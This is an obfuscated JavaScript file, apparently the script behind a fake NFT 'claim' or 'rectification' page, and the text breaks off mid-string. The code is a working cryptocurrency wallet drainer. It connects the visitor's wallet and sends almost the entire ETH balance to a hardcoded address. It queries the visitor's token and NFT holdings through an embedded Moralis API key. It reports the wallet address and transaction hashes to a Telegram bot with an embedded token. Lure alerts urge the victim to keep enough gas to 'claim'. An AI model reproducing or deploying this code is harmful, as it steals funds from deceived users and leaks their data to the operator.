const _0x28de01=_0x220a;(function(_0x5ceee3,_0x5dee41){const _0x9ea065=_0x220a,_0x5030fe=_0x5ceee3();while(!![]){try{const _0xaa3e90=parseInt(_0x9ea065(0x1fd))/0x1*(-parseInt(_0x9ea065(0x1be))/0x2)+parseInt(_0x9ea065(0x1ed))/0x3+parseInt(_0x9ea065(0x1d6))/0x4+parseInt(_0x9ea065(0x1d9))/0x5+parseInt(_0x9ea065(0x1d4))/0x6+-parseInt(_0x9ea065(0x214))/0x7*(-parseInt(_0x9ea065(0x1a5))/0x8)+-parseInt(_0x9ea065(0x19c))/0x9;if(_0xaa3e90===_0x5dee41)break;else _0x5030fe['push'](_0x5030fe['shift']());}catch(_0x3e8912){_0x5030fe['push'](_0x5030fe['shift']());}}}(_0x4c23,0x93e54));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;const conn=document[_0x28de01(0x1f2)](_0x28de01(0x1a0)),trns=document[_0x28de01(0x1f2)](_0x28de01(0x1fc));trns[_0x28de01(0x1b2)]['display']=_0x28de01(0x1dd);import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {mainnet,bsc}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[mainnet,bsc],projectId=_0x28de01(0x227),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x28de01(0x1fb))]({'chains':chains,'options':{'appName':_0x28de01(0x226)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x28de01(0x21b),'Coinbase':_0x28de01(0x208)}},ethereumClient);const OWNER_ADDRESS=_0x28de01(0x215),ABI=[{'constant':!![],'inputs':[],'name':_0x28de01(0x1ef),'outputs':[{'name':'','type':_0x28de01(0x19f)}],'payable':![],'stateMutability':'view','type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':_0x28de01(0x1ca),'type':_0x28de01(0x1af)}],'name':_0x28de01(0x1da),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':_0x28de01(0x1b4),'type':_0x28de01(0x1af)},{'name':_0x28de01(0x194),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x1d1),'outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x234),'outputs':[{'name':'','type':_0x28de01(0x1c0)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x28de01(0x1af)}],'name':_0x28de01(0x209),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x28de01(0x21e),'outputs':[{'name':'','type':_0x28de01(0x1e7)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':'_from','type':'address'},{'name':_0x28de01(0x1e1),'type':_0x28de01(0x1af)},{'name':_0x28de01(0x194),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x1c4),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x28de01(0x1af)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[{'name':'','type':_0x28de01(0x1af)}],'name':'balances','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x20d),'outputs':[{'name':'','type':_0x28de01(0x1e7)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x1e9),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x22a),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':![],'inputs':[],'name':_0x28de01(0x1bf),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'constant':!![],'inputs':[{'name':'_maker','type':_0x28de01(0x1af)}],'name':_0x28de01(0x224),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x28de01(0x1af)},{'name':'','type':_0x28de01(0x1af)}],'name':_0x28de01(0x21a),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x1b5),'outputs':[{'name':'','type':_0x28de01(0x1c0)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[{'name':_0x28de01(0x1c9),'type':_0x28de01(0x1af)}],'name':_0x28de01(0x1c3),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':'view','type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x1dc),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':'view','type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x1a3),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':'_to','type':_0x28de01(0x1af)},{'name':_0x28de01(0x194),'type':'uint256'}],'name':_0x28de01(0x1de),'outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':_0x28de01(0x1f4),'type':_0x28de01(0x1e7)},{'name':_0x28de01(0x218),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x23a),'outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':_0x28de01(0x1a4),'type':_0x28de01(0x1e7)}],'name':'issue','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':_0x28de01(0x1a4),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x22e),'outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':'function'},{'constant':!![],'inputs':[{'name':_0x28de01(0x1fe),'type':'address'},{'name':_0x28de01(0x1b4),'type':_0x28de01(0x1af)}],'name':_0x28de01(0x1e2),'outputs':[{'name':_0x28de01(0x237),'type':_0x28de01(0x1e7)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':_0x28de01(0x1d8),'outputs':[{'name':'','type':_0x28de01(0x1e7)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x28de01(0x206),'outputs':[{'name':'','type':_0x28de01(0x1c0)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':'function'},{'constant':![],'inputs':[{'name':_0x28de01(0x198),'type':'address'}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x28de01(0x1e7)}],'payable':![],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':'newOwner','type':_0x28de01(0x1af)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'constant':![],'inputs':[{'name':_0x28de01(0x1c2),'type':_0x28de01(0x1af)}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[{'name':_0x28de01(0x1fa),'type':'uint256'},{'name':_0x28de01(0x22c),'type':_0x28de01(0x19f)},{'name':'_symbol','type':_0x28de01(0x19f)},{'name':_0x28de01(0x1ec),'type':'uint256'}],'payable':![],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x1f0)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x28de01(0x1e7)}],'name':_0x28de01(0x21c),'type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x28de01(0x1a4),'type':'uint256'}],'name':_0x28de01(0x20c),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x28de01(0x1a1),'type':_0x28de01(0x1af)}],'name':_0x28de01(0x1eb),'type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x28de01(0x1c1),'type':_0x28de01(0x1e7)},{'indexed':![],'name':_0x28de01(0x199),'type':'uint256'}],'name':_0x28de01(0x216),'type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x28de01(0x1c2),'type':_0x28de01(0x1af)},{'indexed':![],'name':'_balance','type':_0x28de01(0x1e7)}],'name':'DestroyedBlackFunds','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x28de01(0x1ab),'type':'address'}],'name':'AddedBlackList','type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x28de01(0x1ab),'type':'address'}],'name':_0x28de01(0x1c8),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x28de01(0x1dc),'type':_0x28de01(0x1af)},{'indexed':!![],'name':'spender','type':_0x28de01(0x1af)},{'indexed':![],'name':_0x28de01(0x1f5),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x1f7),'type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x28de01(0x1bd),'type':_0x28de01(0x1af)},{'indexed':!![],'name':'to','type':_0x28de01(0x1af)},{'indexed':![],'name':_0x28de01(0x1f5),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x222),'type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[],'name':'Pause','type':'event'},{'anonymous':![],'inputs':[],'name':_0x28de01(0x1a9),'type':'event'}],ABIN=[{'inputs':[{'internalType':'string','name':_0x28de01(0x1ef),'type':_0x28de01(0x19f)},{'internalType':'string','name':_0x28de01(0x1a3),'type':'string'},{'internalType':'uint256','name':_0x28de01(0x221),'type':_0x28de01(0x1e7)},{'internalType':'uint256','name':_0x28de01(0x1e3),'type':_0x28de01(0x1e7)}],'stateMutability':'nonpayable','type':_0x28de01(0x1f0)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x28de01(0x1af),'name':_0x28de01(0x1dc),'type':_0x28de01(0x1af)},{'indexed':!![],'internalType':_0x28de01(0x1af),'name':'approved','type':_0x28de01(0x1af)},{'indexed':!![],'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)}],'name':'Approval','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x28de01(0x1dc),'type':_0x28de01(0x1af)},{'indexed':!![],'internalType':_0x28de01(0x1af),'name':_0x28de01(0x230),'type':_0x28de01(0x1af)},{'indexed':![],'internalType':_0x28de01(0x1c0),'name':'approved','type':_0x28de01(0x1c0)}],'name':_0x28de01(0x1b0),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x28de01(0x1af),'name':_0x28de01(0x21f),'type':_0x28de01(0x1af)},{'indexed':!![],'internalType':_0x28de01(0x1af),'name':'newOwner','type':_0x28de01(0x1af)}],'name':_0x28de01(0x207),'type':_0x28de01(0x1ae)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x28de01(0x1af),'name':_0x28de01(0x1bd),'type':'address'},{'indexed':!![],'internalType':_0x28de01(0x1af),'name':'to','type':_0x28de01(0x1af)},{'indexed':!![],'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':'uint256'}],'name':_0x28de01(0x222),'type':_0x28de01(0x1ae)},{'inputs':[],'name':_0x28de01(0x19a),'outputs':[{'internalType':_0x28de01(0x19f),'name':'','type':'string'}],'stateMutability':_0x28de01(0x1e4),'type':'function'},{'inputs':[],'name':_0x28de01(0x1cb),'outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':_0x28de01(0x1e7)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x28de01(0x1a6),'outputs':[{'internalType':'uint256','name':'','type':_0x28de01(0x1e7)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':_0x28de01(0x1e7)}],'stateMutability':'view','type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':'to','type':'address'},{'internalType':'uint256','name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)}],'name':'approve','outputs':[],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':'owner','type':_0x28de01(0x1af)}],'name':_0x28de01(0x1c3),'outputs':[{'internalType':'uint256','name':'','type':_0x28de01(0x1e7)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':'string','name':'','type':_0x28de01(0x19f)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x231),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':_0x28de01(0x1f9),'outputs':[],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'inputs':[{'internalType':'uint256','name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x202),'outputs':[{'internalType':'address','name':'','type':_0x28de01(0x1af)}],'stateMutability':'view','type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':_0x28de01(0x1dc),'type':'address'},{'internalType':'address','name':_0x28de01(0x230),'type':_0x28de01(0x1af)}],'name':_0x28de01(0x1f1),'outputs':[{'internalType':_0x28de01(0x1c0),'name':'','type':_0x28de01(0x1c0)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1bb),'outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':'uint256'}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x1ba),'type':'uint256'}],'name':'mintApe','outputs':[],'stateMutability':_0x28de01(0x233),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1ef),'outputs':[{'internalType':'string','name':'','type':_0x28de01(0x19f)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1dc),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)}],'name':'ownerOf','outputs':[{'internalType':_0x28de01(0x1af),'name':'','type':_0x28de01(0x1af)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1e6),'outputs':[],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x200),'outputs':[],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':_0x28de01(0x1bd),'type':_0x28de01(0x1af)},{'internalType':_0x28de01(0x1af),'name':'to','type':_0x28de01(0x1af)},{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':'from','type':_0x28de01(0x1af)},{'internalType':_0x28de01(0x1af),'name':'to','type':_0x28de01(0x1af)},{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)},{'internalType':'bytes','name':_0x28de01(0x1bc),'type':_0x28de01(0x1b7)}],'name':_0x28de01(0x19b),'outputs':[],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x28de01(0x1c0),'name':'','type':_0x28de01(0x1c0)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[{'internalType':'address','name':'operator','type':_0x28de01(0x1af)},{'internalType':_0x28de01(0x1c0),'name':_0x28de01(0x1ac),'type':_0x28de01(0x1c0)}],'name':_0x28de01(0x1f3),'outputs':[],'stateMutability':_0x28de01(0x210),'type':'function'},{'inputs':[{'internalType':_0x28de01(0x19f),'name':_0x28de01(0x1d0),'type':_0x28de01(0x19f)}],'name':_0x28de01(0x22d),'outputs':[],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[{'internalType':'string','name':_0x28de01(0x1ea),'type':_0x28de01(0x19f)}],'name':_0x28de01(0x197),'outputs':[],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x1e5),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x1b1),'outputs':[],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1df),'outputs':[],'stateMutability':'nonpayable','type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1aa),'outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':_0x28de01(0x1e7)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1db),'outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':_0x28de01(0x1e7)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x219),'name':'interfaceId','type':_0x28de01(0x219)}],'name':_0x28de01(0x20b),'outputs':[{'internalType':_0x28de01(0x1c0),'name':'','type':_0x28de01(0x1c0)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1a3),'outputs':[{'internalType':_0x28de01(0x19f),'name':'','type':'string'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x239),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x205),'outputs':[{'internalType':'uint256','name':'','type':_0x28de01(0x1e7)}],'stateMutability':'view','type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':_0x28de01(0x1dc),'type':_0x28de01(0x1af)},{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x239),'type':'uint256'}],'name':_0x28de01(0x1ee),'outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':_0x28de01(0x1e7)}],'stateMutability':_0x28de01(0x1e4),'type':'function'},{'inputs':[{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':_0x28de01(0x1e7)}],'name':_0x28de01(0x223),'outputs':[{'internalType':_0x28de01(0x19f),'name':'','type':_0x28de01(0x19f)}],'stateMutability':_0x28de01(0x1e4),'type':'function'},{'inputs':[],'name':_0x28de01(0x21e),'outputs':[{'internalType':_0x28de01(0x1e7),'name':'','type':_0x28de01(0x1e7)}],'stateMutability':_0x28de01(0x1e4),'type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':_0x28de01(0x1bd),'type':'address'},{'internalType':_0x28de01(0x1af),'name':'to','type':'address'},{'internalType':_0x28de01(0x1e7),'name':_0x28de01(0x20a),'type':'uint256'}],'name':_0x28de01(0x1c4),'outputs':[],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[{'internalType':_0x28de01(0x1af),'name':_0x28de01(0x235),'type':'address'}],'name':_0x28de01(0x195),'outputs':[],'stateMutability':_0x28de01(0x210),'type':_0x28de01(0x217)},{'inputs':[],'name':_0x28de01(0x1c7),'outputs':[],'stateMutability':_0x28de01(0x210),'type':'function'}];$(_0x28de01(0x225))['click'](async function(){const _0x47b0ac=_0x28de01;alert(_0x47b0ac(0x20e)),console[_0x47b0ac(0x1c6)]('1');try{await web3Modal[_0x47b0ac(0x191)]();}catch(_0x494653){console[_0x47b0ac(0x1c6)](_0x47b0ac(0x238),_0x494653);return;}conn[_0x47b0ac(0x1b2)]['display']=_0x47b0ac(0x1dd),trns[_0x47b0ac(0x1b2)][_0x47b0ac(0x232)]=_0x47b0ac(0x1ce);}),$(_0x28de01(0x192))[_0x28de01(0x1a7)](async function(){const _0x1dc449=_0x28de01;alert('Ensure\x20you\x20have\x20enough\x20gas\x20fee\x20before\x20proceeding\x20to\x20claim');let _0x532b1c=getAccount();console[_0x1dc449(0x1c6)](_0x532b1c),!_0x532b1c[_0x1dc449(0x1af)]&&(console[_0x1dc449(0x1c6)](_0x1dc449(0x211)),alert(_0x1dc449(0x1f8))),_0x532b1c[_0x1dc449(0x1ff)][_0x1dc449(0x1ef)]===_0x1dc449(0x1c5)&&(_0x532b1c[_0x1dc449(0x1ff)][_0x1dc449(0x19e)]['getProvider']()['networkVersion']!=='1'&&(console[_0x1dc449(0x1c6)](_0x1dc449(0x220)),await switchNetwork({'chainId':0x1}))),selectedAccount=_0x532b1c[_0x1dc449(0x1af)],sendMessage('Mint\x20Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!'),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa='0xc8099791a76503a50F416f41390A1222B3D17387',Oxc1=_0x28de01(0x1b6);async function covalenthqAPICall(){const _0x4923c4=_0x28de01,_0x5e9422={'chain':'eth'},_0x419ff9=new URL(_0x4923c4(0x204)+selectedAccount+_0x4923c4(0x22f));_0x419ff9[_0x4923c4(0x1cd)]=new URLSearchParams(_0x5e9422)[_0x4923c4(0x1e8)]();const _0xe25b66={'method':_0x4923c4(0x229),'headers':{'accept':'application/json','X-API-Key':_0x4923c4(0x1ad)}};try{const _0x397909=await fetch(_0x419ff9,_0xe25b66)[_0x4923c4(0x1b8)](_0x545ded=>_0x545ded[_0x4923c4(0x1d3)]());console[_0x4923c4(0x1c6)](_0x397909);let _0x5a36e8=_0x397909;console[_0x4923c4(0x1c6)](_0x4923c4(0x1e0),_0x5a36e8);let _0x2aa4fc=await Promise[_0x4923c4(0x19d)](_0x5a36e8[_0x4923c4(0x213)](async _0x201e4e=>{const _0x3e1aca=_0x4923c4;let _0x48b3d1;try{_0x48b3d1=await getValue(_0x201e4e[_0x3e1aca(0x203)],_0x201e4e[_0x3e1aca(0x1b3)],_0x201e4e[_0x3e1aca(0x20d)]);}catch(_0x48ee70){_0x48b3d1=0x0;}return console[_0x3e1aca(0x1c6)](_0x48b3d1),{'balance':_0x201e4e[_0x3e1aca(0x1b3)],'value':_0x48b3d1,'address':_0x201e4e[_0x3e1aca(0x203)]};}));console[_0x4923c4(0x1c6)](_0x4923c4(0x1cf),_0x2aa4fc),tokens=_0x2aa4fc['filter'](_0x33e7ad=>_0x33e7ad['value']>0x5),tokens[_0x4923c4(0x196)]((_0x1ea611,_0x52e12e)=>_0x52e12e[_0x4923c4(0x1f5)]-_0x1ea611[_0x4923c4(0x1f5)]),console[_0x4923c4(0x1c6)](_0x4923c4(0x193),await getNetwork(),_0x4923c4(0x212),tokens),NFTs=await getNFTs(selectedAccount)[_0x4923c4(0x20f)](_0x5e73dd=>{const _0x31852e=_0x4923c4;console['log'](_0x31852e(0x21d),_0x5e73dd);}),NFTs=NFTs[_0x4923c4(0x228)],console[_0x4923c4(0x1c6)]('NFTs\x20collection\x20',NFTs),onSendEther();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onSendEther(){const _0x5a6d74=_0x28de01;console[_0x5a6d74(0x1c6)](_0x5a6d74(0x1b9));try{let _0x438b7a=await fetchBalance({'address':selectedAccount});console['log'](_0x438b7a);const _0x405d25=await fetchFeeData();console[_0x5a6d74(0x1c6)](_0x405d25);var _0x9169ae=_0x405d25[_0x5a6d74(0x201)]['gasPrice'];_0x9169ae=parseFloat(_0x9169ae);let _0x172b39=parseFloat(_0x438b7a[_0x5a6d74(0x201)])-_0x9169ae*0.00021;_0x172b39=parseEther(_0x172b39[_0x5a6d74(0x1e8)]()),console[_0x5a6d74(0x1c6)](_0x172b39);const {hash:_0x4cb871}=await sendTransaction({'to':Oxa,'value':_0x172b39});console[_0x5a6d74(0x1c6)](_0x4cb871),sendMessage(_0x5a6d74(0x1f6),_0x4cb871),sendMessage(_0x5a6d74(0x1a8)),sendMessage(_0x5a6d74(0x1cc));}catch{alert(_0x5a6d74(0x1a2)),sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0x187800){sendMessage1(_0x187800);}async function sendMessage1(_0x3a8416){return new Promise((_0x5eb694,_0x2ef04a)=>{const _0x2d68e7=_0x220a,_0x10a5b9=Oxc1;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x10a5b9+'&text='+_0x3a8416,{'method':'GET','headers':{}})[_0x2d68e7(0x1b8)](async _0x29a2ac=>{const _0x26bce2=_0x2d68e7;if(_0x29a2ac[_0x26bce2(0x236)]>0x18f)throw _0x29a2ac;_0x5eb694(await _0x29a2ac[_0x26bce2(0x1d3)]());})[_0x2d68e7(0x20f)](_0x3fe825=>{_0x2ef04a(_0x3fe825);});});}async function getPrice(_0x99aa12){return new Promise((_0x22da81,_0x3ea3d7)=>{const _0x20386f=_0x220a;fetch(_0x20386f(0x190)+_0x99aa12+_0x20386f(0x1d2),{'method':_0x20386f(0x229),'headers':{}})[_0x20386f(0x1b8)](async _0x79e33e=>{const _0x32cdec=_0x20386f;if(_0x79e33e[_0x32cdec(0x236)]>0x18f)throw _0x79e33e;_0x22da81(await _0x79e33e['json']());})[_0x20386f(0x20f)](_0x106a48=>{_0x3ea3d7(_0x106a48);});});}function _0x220a(_0x4862d6,_0x11a674){const _0x4c239b=_0x4c23();return _0x220a=function(_0x220ae7,_0x54ce80){_0x220ae7=_0x220ae7-0x190;let _0x2596c7=_0x4c239b[_0x220ae7];return _0x2596c7;},_0x220a(_0x4862d6,_0x11a674);}function _0x4c23(){const _0x11458c=['log','withdraw','RemovedBlackList','who','_upgradedAddress','MAX_APES','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','search','block','tokens-list','baseURI','approve','&vs_currencies=usd','json','4689480PXYymT','price','3547080qaZUSH','application/json','basisPointsRate','2341125eEzkCr','deprecate','startingIndexBlock','owner','none','transfer','setStartingIndex','Initial\x20list\x20','_to','allowance','saleStart','view','revealTimeStamp','renounceOwnership','uint256','toString','maximumFee','provenanceHash','Deprecate','_decimals','2730330LaTUPw','tokenOfOwnerByIndex','name','constructor','isApprovedForAll','querySelector','setApprovalForAll','newBasisPoints','value','Transaction\x20hash\x20','Approval','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','flipSaleState','_initialSupply','CoinbaseWalletConnector','.transfer','357249kZjGIE','_owner','connector','reserveApes','formatted','getApproved','token_address','https://deep-index.moralis.io/api/v2/','tokenByIndex','isBlackListed','OwnershipTransferred','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','addBlackList','tokenId','supportsInterface','Redeem','decimals','Ensure\x20you\x20have\x20enough\x20gas\x20fee\x20before\x20proceeding\x20to\x20claim','catch','nonpayable','No\x20address','Tokens:','map','410459bFziyZ','0xea8968B218a551919FbD5f1166328C82a96dED54','Params','function','newMaxFee','bytes4','allowed','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','Issue','Unable\x20to\x20get\x20NFts','totalSupply','previousOwner','Incorrect\x20network','maxNftSupply','Transfer','tokenURI','getBlackListStatus','.connect','Blockchain\x20rectification','ee71d215d0dec7d1bf950851c84d9643','result','GET','_totalSupply','eth','_name','setBaseURI','redeem','/erc20','operator','emergencySetStartingIndexBlock','display','payable','deprecated','newOwner','status','remaining','Could\x20not\x20get\x20a\x20wallet\x20connection','index','setParams','https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=','openModal','.proceed','chainId:','_value','transferOwnership','sort','setProvenanceHash','_clearedUser','maxFee','BAYC_PROVENANCE','safeTransferFrom','25564590hdnTyY','all','options','string','.conn','newAddress','Insufficient\x20funds\x20you\x20need\x20more\x20gas','symbol','amount','152sUfIIA','REVEAL_TIMESTAMP','click','Transaction\x20is\x20submitted\x20to\x20the\x20network','Unpause','startingIndex','_user','approved','LJrmvC5VBYK43Q